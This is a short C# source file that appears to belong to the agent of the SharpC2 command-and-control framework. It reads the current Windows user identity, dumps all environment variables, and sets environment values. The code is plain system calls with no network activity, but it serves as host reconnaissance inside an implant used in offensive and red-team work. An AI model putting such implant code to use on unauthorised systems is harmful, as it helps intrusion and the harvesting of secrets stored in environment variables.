using Agent.Models;

using System;
using System.Collections;
using System.Security.Principal;

namespace Agent
{
    class Env
    {
        public static string GetUserIdentity()
        {
            return WindowsIdentity.GetCurrent().Name;
        }

        public static string GetEnvironmentVariables()
        {
            var result = new SharpC2ResultList<EnvironmentVariableResult>();
            var variables = Environment.GetEnvironmentVariables();

            foreach (DictionaryEntry env in variables)
            {
                result.Add(new EnvironmentVariableResult
                {
                    Key = env.Key as string,
                    Value = env.Value as string
                });
            }

            return result.ToString();
        }

        public static void SetEnvironmentValue(string key, string value)
        {
            Environment.SetEnvironmentVariable(key, value);
        }
    }
}